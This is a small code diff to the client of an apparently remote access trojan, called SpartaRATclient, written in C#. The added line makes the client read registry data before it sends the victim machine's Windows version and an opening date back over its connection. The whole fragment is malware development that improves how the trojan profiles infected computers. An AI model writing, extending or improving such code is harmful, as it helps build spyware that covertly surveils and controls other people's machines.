@@ -170,6 +170,7 @@ namespace SpartaRATclient
             Thread.Sleep(10000);
 
             RegistryData data = new RegistryData();
+            data.GetRegistryData();
             this.Send(Encoding.ASCII.GetBytes(data.OSVersion), 16); //Windows Version and Type
             this.Send(Encoding.ASCII.GetBytes(data.OpenedDate), 19); //Opening date
 
